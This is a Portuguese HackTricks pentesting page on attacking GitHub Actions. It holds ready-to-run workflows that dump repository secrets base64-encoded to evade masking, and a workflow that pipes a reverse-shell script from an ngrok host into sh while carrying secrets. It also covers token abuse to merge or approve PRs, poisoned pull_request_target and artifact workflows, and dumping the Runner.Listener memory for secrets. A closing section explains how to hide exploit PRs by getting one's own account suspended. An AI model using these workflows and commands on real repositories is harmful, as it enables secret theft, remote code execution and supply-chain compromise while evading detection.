# Abusando do Github Actions

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

Nesta p√°gina voc√™ encontrar√°:

* Um **resumo de todos os impactos** de um atacante conseguindo acessar um Github Action
* Diferentes maneiras de **obter acesso a uma a√ß√£o**:
* Ter **permiss√µes** para criar a a√ß√£o
* Abusar de **gatilhos** relacionados a **pull request**
* Abusar de **outras t√©cnicas de acesso externo**
* **Pivotar** de um reposit√≥rio j√° comprometido
* Finalmente, uma se√ß√£o sobre **t√©cnicas de p√≥s-explora√ß√£o para abusar de uma a√ß√£o de dentro** (causar os impactos mencionados)

## Resumo dos Impactos

Para uma introdu√ß√£o sobre [**Github Actions, confira as informa√ß√µes b√°sicas**](../basic-github-information.md#github-actions).

Caso voc√™ consiga **executar a√ß√µes arbitr√°rias do Github/injetar c√≥digo** em um **reposit√≥rio**, voc√™ poder√°:

* **Roubar** os **segredos** daquele reposit√≥rio/organiza√ß√£o.
* Se voc√™ s√≥ puder injetar, pode roubar o que j√° est√° presente no fluxo de trabalho.
* Abusar de **privil√©gios de reposit√≥rio** para acessar outras plataformas como AWS e GCP.
* **Executar c√≥digo em trabalhadores personalizados** (se trabalhadores personalizados forem usados) e tentar pivotar a partir da√≠.
* **Sobrescrever** o **c√≥digo** do reposit√≥rio.
* Isso depende dos privil√©gios do `GITHUB_TOKEN` (se houver).
* **Comprometer** **implanta√ß√µes** e outros **artefatos**.
* Se o c√≥digo estiver implantando ou armazenando algo, voc√™ poder√° modificar isso e obter algum acesso adicional.

## GITHUB\_TOKEN

Este "**segredo**" (vindo de `${{ secrets.GITHUB_TOKEN }}` e `${{ github.token }}`) √© fornecido quando o administrador habilita esta op√ß√£o:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

Este token √© o mesmo que uma **Aplica√ß√£o do Github usar√°**, ent√£o pode acessar os mesmos endpoints: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
O Github deve liberar um [**fluxo**](https://github.com/github/roadmap/issues/74) que **permita acesso entre reposit√≥rios** dentro do GitHub, para que um reposit√≥rio possa acessar outros reposit√≥rios internos usando o `GITHUB_TOKEN`.
{% endhint %}

Voc√™ pode ver as poss√≠veis **permiss√µes** deste token em: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

Note que o token **expira ap√≥s a conclus√£o do trabalho**.\
Esses tokens se parecem com isso: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Algumas coisas interessantes que voc√™ pode fazer com este token:

{% tabs %}
{% tab title="Mesclar PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Aprovar PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Criar PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Observe que em v√°rias ocasi√µes voc√™ poder√° encontrar **tokens de usu√°rio do github dentro das envs do Github Actions ou nos segredos**. Esses tokens podem lhe dar mais privil√©gios sobre o reposit√≥rio e a organiza√ß√£o.
{% endhint %}

<details>

<summary>Listar segredos na sa√≠da do Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obter shell reverso com segredos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

√â poss√≠vel verificar as permiss√µes concedidas a um Github Token em reposit√≥rios de outros usu√°rios **verificando os logs** das a√ß√µes:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Execu√ß√£o Permitida

{% hint style="info" %}
Esta seria a maneira mais f√°cil de comprometer a√ß√µes do Github, j√° que este caso sup√µe que voc√™ tenha acesso para **criar um novo reposit√≥rio na organiza√ß√£o**, ou tenha **privilegios de escrita sobre um reposit√≥rio**.

Se voc√™ estiver nesse cen√°rio, pode apenas verificar as [t√©cnicas de P√≥s Explora√ß√£o](./#post-exploitation-techniques-from-inside-an-action).
{% endhint %}

### Execu√ß√£o a partir da Cria√ß√£o de Reposit√≥rio

Caso membros de uma organiza√ß√£o possam **criar novos reposit√≥rios** e voc√™ possa executar a√ß√µes do github, voc√™ pode **criar um novo reposit√≥rio e roubar os segredos definidos no n√≠vel da organiza√ß√£o**.

### Execu√ß√£o a partir de um Novo Branch

Se voc√™ puder **criar um novo branch em um reposit√≥rio que j√° cont√©m uma A√ß√£o do Github** configurada, voc√™ pode **modific√°-la**, **carregar** o conte√∫do e ent√£o **executar essa a√ß√£o a partir do novo branch**. Dessa forma, voc√™ pode **exfiltrar segredos em n√≠vel de reposit√≥rio e organiza√ß√£o** (mas voc√™ precisa saber como eles s√£o chamados).

Voc√™ pode tornar a a√ß√£o modificada execut√°vel **manualmente,** quando um **PR √© criado** ou quando **algum c√≥digo √© enviado** (dependendo de qu√£o barulhento voc√™ quer ser):
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Execu√ß√£o Forked

{% hint style="info" %}
Existem diferentes gatilhos que poderiam permitir a um atacante **executar uma Github Action de outro reposit√≥rio**. Se essas a√ß√µes acion√°veis estiverem mal configuradas, um atacante poder√° compromet√™-las.
{% endhint %}

### `pull_request`

O gatilho de workflow **`pull_request`** executar√° o workflow toda vez que um pull request for recebido, com algumas exce√ß√µes: por padr√£o, se for a **primeira vez** que voc√™ est√° **colaborando**, algum **mantenedor** precisar√° **aprovar** a **execu√ß√£o** do workflow:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Como a **limita√ß√£o padr√£o** √© para **contribuidores de primeira viagem**, voc√™ poderia contribuir **corrigindo um bug/erro v√°lido** e ent√£o enviar **outros PRs para abusar de seus novos privil√©gios de `pull_request`**.

**Eu testei isso e n√£o funciona**: ~~Outra op√ß√£o seria criar uma conta com o nome de algu√©m que contribuiu para o projeto e deletou sua conta.~~
{% endhint %}

Al√©m disso, por padr√£o **impede permiss√µes de escrita** e **acesso a segredos** no reposit√≥rio alvo, conforme mencionado na [**documenta√ß√£o**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories):

> Com a exce√ß√£o de `GITHUB_TOKEN`, **segredos n√£o s√£o passados para o runner** quando um workflow √© acionado de um reposit√≥rio **forked**. O **`GITHUB_TOKEN` tem permiss√µes de leitura** em pull requests **de reposit√≥rios forked**.

Um atacante poderia modificar a defini√ß√£o da Github Action para executar coisas arbitr√°rias e adicionar a√ß√µes arbitr√°rias. No entanto, ele n√£o poder√° roubar segredos ou sobrescrever o reposit√≥rio devido √†s limita√ß√µes mencionadas.

{% hint style="danger" %}
**Sim, se o atacante mudar no PR a github action que ser√° acionada, sua Github Action ser√° a utilizada e n√£o a do reposit√≥rio de origem!**
{% endhint %}

Como o atacante tamb√©m controla o c√≥digo sendo executado, mesmo que n√£o haja segredos ou permiss√µes de escrita no `GITHUB_TOKEN`, um atacante poderia, por exemplo, **carregar artefatos maliciosos**.

### **`pull_request_target`**

O gatilho de workflow **`pull_request_target`** tem **permiss√£o de escrita** no reposit√≥rio alvo e **acesso a segredos** (e n√£o pede permiss√£o).

Note que o gatilho de workflow **`pull_request_target`** **executa no contexto base** e n√£o no fornecido pelo PR (para **n√£o executar c√≥digo n√£o confi√°vel**). Para mais informa√ß√µes sobre `pull_request_target`, [**verifique a documenta√ß√£o**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Al√©m disso, para mais informa√ß√µes sobre esse uso espec√≠fico e perigoso, confira este [**post no blog do github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

Pode parecer que, como o **workflow executado** √© o definido no **base** e **n√£o no PR**, √© **seguro** usar **`pull_request_target`**, mas h√° **alguns casos em que n√£o √©**.

E este ter√° **acesso a segredos**.

### `workflow_run`

O gatilho [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) permite executar um workflow a partir de outro quando est√° `completo`, `solicitado` ou `em_progresso`.

Neste exemplo, um workflow √© configurado para ser executado ap√≥s a conclus√£o do workflow separado "Executar Testes":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Al√©m disso, de acordo com a documenta√ß√£o: O fluxo de trabalho iniciado pelo evento `workflow_run` √© capaz de **acessar segredos e escrever tokens, mesmo que o fluxo de trabalho anterior n√£o tenha sido**.

Esse tipo de fluxo de trabalho pode ser atacado se **depender** de um **fluxo de trabalho** que pode ser **ativado** por um usu√°rio externo via **`pull_request`** ou **`pull_request_target`**. Alguns exemplos vulner√°veis podem ser [**encontrados neste blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** O primeiro consiste no fluxo de trabalho acionado por **`workflow_run`** baixando o c√≥digo dos atacantes: `${{ github.event.pull_request.head.sha }}`\
O segundo consiste em **passar** um **artefato** do c√≥digo **n√£o confi√°vel** para o fluxo de trabalho **`workflow_run`** e usar o conte√∫do desse artefato de uma maneira que o torne **vulner√°vel a RCE**.

### `workflow_call`

TODO

TODO: Verificar se, quando executado a partir de um pull\_request, o c√≥digo usado/baixado √© o do origin ou do PR bifurcado

## Abusando da Execu√ß√£o Bifurcada

Mencionamos todas as maneiras que um atacante externo poderia conseguir fazer um fluxo de trabalho do github ser executado, agora vamos dar uma olhada em como essas execu√ß√µes, se mal configuradas, poderiam ser abusadas:

### Execu√ß√£o de checkout n√£o confi√°vel

No caso de **`pull_request`,** o fluxo de trabalho ser√° executado no **contexto do PR** (ent√£o executar√° o **c√≥digo malicioso do PR**), mas algu√©m precisa **autoriz√°-lo primeiro** e ele ser√° executado com algumas [limita√ß√µes](./#pull\_request).

No caso de um fluxo de trabalho usando **`pull_request_target` ou `workflow_run`** que depende de um fluxo de trabalho que pode ser acionado a partir de **`pull_request_target` ou `pull_request`**, o c√≥digo do reposit√≥rio original ser√° executado, ent√£o o **atacante n√£o pode controlar o c√≥digo executado**.

{% hint style="danger" %}
No entanto, se a **a√ß√£o** tiver um **checkout de PR expl√≠cito** que **obter√° o c√≥digo do PR** (e n√£o da base), usar√° o c√≥digo controlado pelos atacantes. Por exemplo (ver linha 12 onde o c√≥digo do PR √© baixado):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Fornecido apenas como exemplo.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

O c√≥digo potencialmente **n√£o confi√°vel est√° sendo executado durante `npm install` ou `npm build`**, pois os scripts de build e os **pacotes referenciados s√£o controlados pelo autor do PR**.

{% hint style="warning" %}
Um dork do github para procurar a√ß√µes vulner√°veis √©: `event.pull_request pull_request_target extension:yml`, no entanto, existem diferentes maneiras de configurar os trabalhos para serem executados de forma segura, mesmo que a a√ß√£o esteja configurada de forma insegura (como usar condicionais sobre quem √© o ator gerando o PR).
{% endhint %}

### Inje√ß√µes de Script de Contexto <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Observe que existem certos [**contextos do github**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) cujos valores s√£o **controlados** pelo **usu√°rio** que cria o PR. Se a a√ß√£o do github estiver usando esses **dados para executar qualquer coisa**, isso pode levar √† **execu√ß√£o de c√≥digo arbitr√°rio:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **Inje√ß√£o de Script GITHUB\_ENV** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

De acordo com a documenta√ß√£o: Voc√™ pode tornar uma **vari√°vel de ambiente dispon√≠vel para quaisquer etapas subsequentes** em um trabalho de fluxo de trabalho definindo ou atualizando a vari√°vel de ambiente e escrevendo isso no arquivo de ambiente **`GITHUB_ENV`**.

Se um atacante puder **injetar qualquer valor** dentro dessa vari√°vel **env**, ele poder√° injetar vari√°veis de ambiente que poderiam executar c√≥digo nas etapas seguintes, como **LD\_PRELOAD** ou **NODE\_OPTIONS**.

Por exemplo ([**este**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) e [**este**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine um fluxo de trabalho que confia em um artefato carregado para armazenar seu conte√∫do dentro da vari√°vel de ambiente **`GITHUB_ENV`**. Um atacante poderia carregar algo assim para compromet√™-lo:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### A√ß√µes do Github de Terceiros Vulner√°veis

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

Como mencionado em [**este post do blog**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), esta A√ß√£o do Github permite acessar artefatos de diferentes fluxos de trabalho e at√© mesmo reposit√≥rios.

O problema √© que se o par√¢metro **`path`** n√£o estiver definido, o artefato √© extra√≠do no diret√≥rio atual e pode sobrescrever arquivos que poderiam ser usados ou at√© mesmo executados no fluxo de trabalho. Portanto, se o Artefato for vulner√°vel, um atacante poderia abusar disso para comprometer outros fluxos de trabalho que confiam no Artefato.

Exemplo de fluxo de trabalho vulner√°vel:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Isso pode ser atacado com este fluxo de trabalho:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Outro Acesso Externo

### Sequestro de Reposit√≥rio de Namespace Deletado

Se uma conta mudar seu nome, outro usu√°rio pode registrar uma conta com esse nome ap√≥s algum tempo. Se um reposit√≥rio tinha **menos de 100 estrelas antes da mudan√ßa de nome**, o Github permitir√° que o novo usu√°rio registrado com o mesmo nome crie um **reposit√≥rio com o mesmo nome** que o deletado.

{% hint style="danger" %}
Portanto, se uma a√ß√£o estiver usando um reposit√≥rio de uma conta inexistente, ainda √© poss√≠vel que um atacante crie essa conta e comprometa a a√ß√£o.
{% endhint %}

Se outros reposit√≥rios estavam usando **depend√™ncias dos reposit√≥rios desse usu√°rio**, um atacante poder√° sequestr√°-los. Aqui est√° uma explica√ß√£o mais completa: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Pivotagem de Reposit√≥rio

{% hint style="info" %}
Nesta se√ß√£o, falaremos sobre t√©cnicas que permitiriam **pivotar de um reposit√≥rio para outro**, supondo que temos algum tipo de acesso ao primeiro (verifique a se√ß√£o anterior).
{% endhint %}

### Envenenamento de Cache

Um cache √© mantido entre **execu√ß√µes de workflow na mesma branch**. O que significa que, se um atacante **comprometer** um **pacote** que √© ent√£o armazenado no cache e **baixado** e executado por um **workflow mais privilegiado**, ele poder√° **comprometer** tamb√©m esse workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Envenenamento de Artefato

Workflows podem usar **artefatos de outros workflows e at√© reposit√≥rios**. Se um atacante conseguir **comprometer** a Github Action que **faz o upload de um artefato** que √© posteriormente usado por outro workflow, ele poder√° **comprometer os outros workflows**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## P√≥s Explora√ß√£o de uma A√ß√£o

### Acessando AWS e GCP via OIDC

Verifique as seguintes p√°ginas:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Acessando segredos <a href="#accessing-secrets" id="accessing-secrets"></a>

Se voc√™ estiver injetando conte√∫do em um script, √© interessante saber como voc√™ pode acessar segredos:

* Se o segredo ou token estiver definido como uma **vari√°vel de ambiente**, pode ser acessado diretamente atrav√©s do ambiente usando **`printenv`**.

<details>

<summary>Listar segredos na sa√≠da da Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Obter shell reverso com segredos</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Se o segredo for usado **diretamente em uma express√£o**, o script shell gerado √© armazenado **em disco** e √© acess√≠vel.
* ```bash
cat /home/runner/work/_temp/*
```
* Para a√ß√µes JavaScript, os segredos s√£o enviados atrav√©s de vari√°veis de ambiente.
* ```bash
ps axe | grep node
```
* Para uma **a√ß√£o personalizada**, o risco pode variar dependendo de como um programa est√° usando o segredo que obteve do **argumento**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Abusando de runners auto-hospedados

A maneira de descobrir quais **Github Actions est√£o sendo executadas em infraestrutura n√£o-Github** √© procurar por **`runs-on: self-hosted`** na configura√ß√£o yaml da Github Action.

Runners **auto-hospedados** podem ter acesso a **informa√ß√µes extra sens√≠veis**, a outros **sistemas de rede** (pontos finais vulner√°veis na rede? servi√ßo de metadados?) ou, mesmo que esteja isolado e destru√≠do, **mais de uma a√ß√£o pode ser executada ao mesmo tempo** e a maliciosa pode **roubar os segredos** da outra.

Em runners auto-hospedados, tamb√©m √© poss√≠vel obter os **segredos do processo \_Runner.Listener**\_\*\* que conter√° todos os segredos dos fluxos de trabalho em qualquer etapa, despejando sua mem√≥ria:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

Verifique [**este post para mais informa√ß√µes**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Registro de Imagens Docker do Github

√â poss√≠vel criar a√ß√µes do Github que **construir√£o e armazenar√£o uma imagem Docker dentro do Github**.\
Um exemplo pode ser encontrado no seguinte expans√≠vel:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Como voc√™ pode ver no c√≥digo anterior, o registro do Github est√° hospedado em **`ghcr.io`**.

Um usu√°rio com permiss√µes de leitura sobre o reposit√≥rio poder√° ent√£o baixar a Imagem Docker usando um token de acesso pessoal:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Ent√£o, o usu√°rio poderia procurar por **segredos vazados nas camadas da imagem Docker:**

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Informa√ß√µes sens√≠veis nos logs do Github Actions

Mesmo que o **Github** tente **detectar valores secretos** nos logs das a√ß√µes e **evitar mostrar** eles, **outros dados sens√≠veis** que poderiam ter sido gerados na execu√ß√£o da a√ß√£o n√£o ser√£o ocultados. Por exemplo, um JWT assinado com um valor secreto n√£o ser√° ocultado a menos que seja [especificamente configurado](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Cobrir suas Pegadas

(T√©cnica de [**aqui**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) Primeiro de tudo, qualquer PR levantada √© claramente vis√≠vel ao p√∫blico no Github e √† conta alvo do GitHub. No GitHub, por padr√£o, **n√£o podemos deletar um PR da internet**, mas h√° uma reviravolta. Para contas do Github que est√£o **suspensas** pelo Github, todos os seus **PRs s√£o automaticamente deletados** e removidos da internet. Ent√£o, para esconder sua atividade, voc√™ precisa ou ter sua **conta do GitHub suspensa ou ter sua conta sinalizada**. Isso **esconderia todas as suas atividades** no GitHub da internet (basicamente remover todos os seus PRs de explora√ß√£o)

Uma organiza√ß√£o no GitHub √© muito proativa em relatar contas ao GitHub. Tudo que voc√™ precisa fazer √© compartilhar ‚Äúalgumas coisas‚Äù em uma Issue e eles garantir√£o que sua conta seja suspensa em 12 horas :p e a√≠ est√°, fez sua explora√ß√£o invis√≠vel no github.

{% hint style="warning" %}
A √∫nica maneira de uma organiza√ß√£o descobrir que foi alvo √© verificar os logs do GitHub a partir do SIEM, j√° que pela interface do GitHub o PR seria removido.
{% endhint %}

## Ferramentas

As seguintes ferramentas s√£o √∫teis para encontrar fluxos de trabalho do Github Action e at√© mesmo encontrar vulner√°veis:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
